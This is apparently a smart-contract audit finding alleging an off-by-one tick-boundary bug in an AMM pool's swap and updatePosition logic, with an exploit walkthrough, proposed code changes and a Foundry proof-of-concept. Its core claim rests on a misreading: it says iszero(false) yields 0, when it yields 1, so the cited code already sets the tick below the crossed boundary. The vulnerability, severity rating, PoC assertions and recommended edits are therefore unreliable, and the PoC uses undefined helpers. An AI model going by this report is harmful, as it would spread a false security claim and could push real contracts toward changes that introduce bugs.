## Title
Off-By-One Error in Tick Boundary Handling Causes Incorrect Active Liquidity After Tick Crossing

## Summary
There is an inconsistent off-by-one definition between `updatePosition()` and the swap tick-crossing logic regarding when a position is considered active at the exact tick boundary. When a swap crosses tick T from above (decreasing price), the tick is set to T and liquidity is correctly removed. However, `updatePosition()` then considers any position with `tickLower == T` as active (since `tick >= tickLower` evaluates to TRUE), allowing it to incorrectly modify the pool's active liquidity for a position that has already exited.

## Impact
**Severity**: High

## Finding Description

**Location:** [1](#0-0) 

**Intended Logic:** When the current tick is within a position's range `[tickLower, tickUpper)`, `updatePosition()` should update the pool's active liquidity to reflect the liquidity delta. The swap logic should maintain consistency with this definition when crossing tick boundaries.

**Actual Logic:** The swap logic and `updatePosition()` use inconsistent definitions of "active" at the exact tick boundary:

1. **Swap tick crossing (from above):** [2](#0-1) 
   - When crossing tick T from above (decreasing, `increasing=false`), the code sets `tick = nextTick - iszero(false) = nextTick - 0 = T`
   - It applies `liquidityDelta * -1` (subtracts liquidity), correctly removing position [T, X] from active liquidity
   - The final tick stored is exactly T

2. **updatePosition check:** [1](#0-0) 
   - The condition `state.tick() >= positionId.tickLower()` evaluates to TRUE when `tick == tickLower`
   - This causes updatePosition to add/subtract the liquidity delta from active liquidity
   - But the position should NOT be active after crossing from above

3. **Supporting evidence from liquidityDeltaToAmountDelta:** [3](#0-2) 
   - The function considers `sqrtRatio <= sqrtRatioLower` as "below range" (line 37)
   - This means at the exact boundary, the position is NOT in range
   - Yet updatePosition's tick-based check says it IS in range

**Exploitation Path:**

1. **Setup:** Pool exists at tick 101 with position [100, 200] containing 1000 liquidity (currently active). Pool's active liquidity = 1000.

2. **Execute swap crossing tick 100 from above:** 
   - Attacker performs a swap that decreases price, crossing tick 100
   - Swap logic at [4](#0-3)  correctly subtracts 1000 liquidity
   - Tick is set to 100 (line 756)
   - Pool's active liquidity is now 0

3. **Call updatePosition immediately:**
   - Attacker calls `updatePosition()` to add 1 wei of liquidity to position [100, 200]
   - Check at line 409: `100 >= 100 && 100 < 200` → TRUE
   - Pool's active liquidity is updated: `0 + 1 = 1` (line 413)
   - Tick 100's liquidityDelta is updated from +1000 to +1001

4. **Result - Desynchronized state:**
   - Pool active liquidity = 1
   - But position [100, 200] should NOT be contributing liquidity (it exited when crossing from above)
   - Future swaps use incorrect liquidity (1 instead of 0), causing mispricing
   - If price moves up and crosses tick 100 again, liquidity will be increased by 1001 instead of 1000, further compounding the error

**Security Property Broken:** 
- Violates the **Solvency** invariant: Active liquidity no longer matches the sum of all in-range positions, breaking the constant product formula and causing incorrect swap pricing
- Violates **Fee Accounting**: Fees are distributed based on active liquidity; incorrect active liquidity causes incorrect fee allocation

## Impact Explanation

- **Affected Assets:** All swaps in affected pools receive incorrect pricing. LPs in affected positions receive incorrect fee distributions.

- **Damage Severity:** 
  - Active liquidity can be arbitrarily inflated or deflated by repeatedly exploiting this at tick boundaries
  - Each exploitation can add/remove arbitrary amounts of liquidity from the active pool
  - Swap prices become incorrect, enabling arbitrage against the pool at user expense
  - Fee distribution becomes unfair as it's calculated per unit of active liquidity

- **User Impact:** 
  - All users trading in the affected pool receive worse prices
  - All LPs in the affected position ranges receive incorrect fee allocations
  - The pool's pricing mechanism is fundamentally broken
  - Any position update at a tick boundary after a tick crossing can trigger this

## Likelihood Explanation

- **Attacker Profile:** Any user with the ability to call `updatePosition()` (any LP or prospective LP)

- **Preconditions:** 
  - Pool must be initialized with at least one position
  - A swap must cross a tick boundary from above
  - Attacker must call `updatePosition()` before the price moves away from that exact tick

- **Execution Complexity:** 
  - Simple: Single swap transaction followed by single `updatePosition()` call
  - Can be atomically executed in a multicall or single transaction via Router
  - No special timing required beyond catching the state immediately after a tick crossing

- **Frequency:** 
  - Can be exploited every time a swap crosses a tick boundary from above
  - In active pools, this happens frequently (every time price moves through a tick)
  - Attacker can also force this by performing the swap themselves

## Recommendation

The fix requires making the tick boundary condition consistent between swap logic and updatePosition. The issue is that when crossing from above, the tick is set to the crossed tick itself, but this makes it ambiguous whether positions starting at that tick are active. [5](#0-4) 

```solidity
// CURRENT (vulnerable):
// Line 756 in src/Core.sol
tick := sub(nextTick, iszero(increasing))
// When decreasing (increasing=false): tick = nextTick - 0 = nextTick
// This creates ambiguity at the boundary

// FIXED OPTION 1 - Adjust tick assignment:
tick := sub(nextTick, 1)
// Always set tick to nextTick - 1 after crossing
// This makes positions [nextTick, ...] clearly inactive after crossing

// OR

// FIXED OPTION 2 - Adjust updatePosition condition:
// Line 409 in src/Core.sol
if (state.tick() > positionId.tickLower() && state.tick() < positionId.tickUpper()) {
    // Change >= to > so that tick == tickLower is considered inactive
    // This matches the liquidityDeltaToAmountDelta semantics
```

**Recommended approach:** Option 2 is safer as it aligns with the mathematical definitions in `liquidityDeltaToAmountDelta` [6](#0-5)  where `sqrtRatio <= sqrtRatioLower` is considered "below range". Changing line 409 to use strict inequality (`>` instead of `>=`) ensures consistency.

Additionally, update the corresponding logic in `_getPoolFeesPerLiquidityInside`: [7](#0-6) 

```solidity
// Line 198-201 in src/Core.sol
if (tick < tickLower) {
    // below range
} else if (tick <= tickUpper) {  // CHANGE: was "tick < tickUpper"
    // in range - now requires tick > tickLower from the if condition above
```

## Proof of Concept

```solidity
// File: test/Exploit_TickBoundaryDesync.t.sol
// Run with: forge test --match-test test_TickBoundaryDesync -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Router.sol";
import "../src/types/positionId.sol";
import "../src/types/poolKey.sol";

contract Exploit_TickBoundaryDesync is Test {
    Core public core;
    Router public router;
    address public token0;
    address public token1;
    
    function setUp() public {
        // Deploy Core and Router
        core = new Core();
        router = new Router(core);
        
        // Setup tokens (token0 < token1)
        token0 = address(0x1);
        token1 = address(0x2);
        
        // Initialize pool at tick 101
        PoolKey memory poolKey = createPoolKey();
        core.initializePool(poolKey, encodeSqrtRatio(101));
    }
    
    function test_TickBoundaryDesync() public {
        // SETUP: Create position [100, 200] with 1000 liquidity at tick 101
        PoolKey memory poolKey = createPoolKey();
        PositionId positionId = encodePositionId(100, 200);
        
        // Add liquidity - position is active since tick 101 is in [100, 200)
        router.updatePosition(poolKey, positionId, 1000);
        
        PoolState stateBefore = core.readPoolState(poolKey.toPoolId());
        uint128 activeliquidityBefore = stateBefore.liquidity();
        
        assertEq(activeliquidityBefore, 1000, "Initial active liquidity should be 1000");
        assertEq(stateBefore.tick(), 101, "Initial tick should be 101");
        
        // EXPLOIT: Swap down to cross tick 100 from above
        SwapParams memory swapParams = SwapParams({
            zeroForOne: true,
            amount: type(int128).min, // exact output (decreasing price)
            sqrtRatioLimit: encodeSqrtRatio(99) // cross tick 100
        });
        
        core.swap(poolKey, swapParams);
        
        PoolState stateAfterSwap = core.readPoolState(poolKey.toPoolId());
        uint128 activeliquidityAfterSwap = stateAfterSwap.liquidity();
        int32 tickAfterSwap = stateAfterSwap.tick();
        
        // After crossing tick 100 from above:
        // - Liquidity was correctly removed (position [100,200] exited)
        // - But tick is set to exactly 100
        assertEq(activeliquidityAfterSwap, 0, "Active liquidity should be 0 after crossing");
        assertEq(tickAfterSwap, 100, "Tick should be exactly 100");
        
        // EXPLOIT: Call updatePosition to add 1 wei to position [100, 200]
        // This should NOT affect active liquidity since position is not active
        // But due to the bug, it will
        router.updatePosition(poolKey, positionId, 1);
        
        PoolState stateAfterUpdate = core.readPoolState(poolKey.toPoolId());
        uint128 activeliquidityAfterUpdate = stateAfterUpdate.liquidity();
        
        // VERIFY: Active liquidity is now incorrect!
        assertEq(
            activeliquidityAfterUpdate, 
            1, 
            "Vulnerability confirmed: Active liquidity incorrectly increased to 1"
        );
        
        // The position [100, 200] should NOT be active when tick == 100
        // after crossing from above, but updatePosition thinks it is
        // This breaks the active liquidity invariant
    }
}
```

### Citations

**File:** src/Core.sol (L198-201)
```text
            if (tick < tickLower) {
                feesPerLiquidityInside.value0 = lower0 - upper0;
                feesPerLiquidityInside.value1 = lower1 - upper1;
            } else if (tick < tickUpper) {
```

**File:** src/Core.sol (L409-416)
```text
                if (state.tick() >= positionId.tickLower() && state.tick() < positionId.tickUpper()) {
                    state = createPoolState({
                        _sqrtRatio: state.sqrtRatio(),
                        _tick: state.tick(),
                        _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
                    });
                    writePoolState(poolId, state);
                }
```

**File:** src/Core.sol (L752-766)
```text
                    if (sqrtRatioNext == nextTickSqrtRatio) {
                        sqrtRatio = sqrtRatioNext;
                        assembly ("memory-safe") {
                            // no overflow danger because nextTick is always inside the valid tick bounds
                            tick := sub(nextTick, iszero(increasing))
                        }

                        if (isInitialized) {
                            bytes32 tickValue = CoreStorageLayout.poolTicksSlot(poolId, nextTick).load();
                            assembly ("memory-safe") {
                                // if increasing, we add the liquidity delta, otherwise we subtract it
                                let liquidityDelta :=
                                    mul(signextend(15, tickValue), sub(increasing, iszero(increasing)))
                                liquidity := add(liquidity, liquidityDelta)
                            }
```

**File:** src/math/liquidity.sol (L37-48)
```text
        if (sqrtRatio <= sqrtRatioLower) {
            delta0 = SafeCastLib.toInt128(
                sign * int256(uint256(amount0Delta(sqrtRatioLower, sqrtRatioUpper, magnitude, isPositive)))
            );
        } else if (sqrtRatio < sqrtRatioUpper) {
            delta0 = SafeCastLib.toInt128(
                sign * int256(uint256(amount0Delta(sqrtRatio, sqrtRatioUpper, magnitude, isPositive)))
            );
            delta1 = SafeCastLib.toInt128(
                sign * int256(uint256(amount1Delta(sqrtRatioLower, sqrtRatio, magnitude, isPositive)))
            );
        } else {
```
